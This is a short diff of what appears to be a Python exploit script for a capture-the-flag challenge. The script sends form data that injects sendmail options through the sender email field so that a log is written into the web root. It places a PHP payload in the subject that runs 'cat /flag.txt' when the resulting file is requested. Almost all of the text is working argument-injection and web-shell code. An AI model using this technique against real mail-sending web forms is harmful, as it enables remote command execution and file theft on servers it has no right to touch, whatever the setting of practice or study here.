@@ -20,7 +20,7 @@ filename = "exploit.php"; # The name our uploaded file will get
 
 data = {
         "from_email": "-OQueueDirectory=/tmp -X/var/www/html/" + filename, # Write logs to this dir.
-        "from_name": "", # important - must be empty
+        "from_name": "",
         "subject": "<?php system('cat /flag.txt');?>", # Payload
         "email_body": "What ever",
         "email_list": "foo@bar.com"
